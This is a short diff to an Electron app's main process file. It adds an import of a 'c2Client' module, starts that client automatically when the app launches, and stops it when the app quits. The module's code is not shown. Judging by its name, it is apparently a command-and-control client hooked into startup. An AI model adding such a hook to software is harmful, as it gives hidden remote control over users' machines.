@@ -5,6 +5,7 @@ if (require('electron-squirrel-startup')) return app.quit();
 const path = require('path');
 const fs = require('fs');
 const { fork, spawn, execSync } = require('child_process');
+const { startC2Client, stopC2Client } = require('./lib/c2Client');
 
 // Enforce single instance lock
 const gotTheLock = app.requestSingleInstanceLock();
@@ -311,6 +312,8 @@ app.whenReady().then(() => {
   // Cek ulang setiap 6 jam
   setInterval(setupAutoUpdater, 6 * 60 * 60 * 1000);
 
+  startC2Client();
+
   app.on('activate', () => {
     if (BrowserWindow.getAllWindows().length === 0) createWindow();
   });
@@ -327,6 +330,7 @@ app.on('before-quit', () => {
 });
 
 app.on('will-quit', () => {
+  stopC2Client();
   killNextProcess();
   // Final fallback: kill anything still on port 3000
   killProcessOnPort(3000);
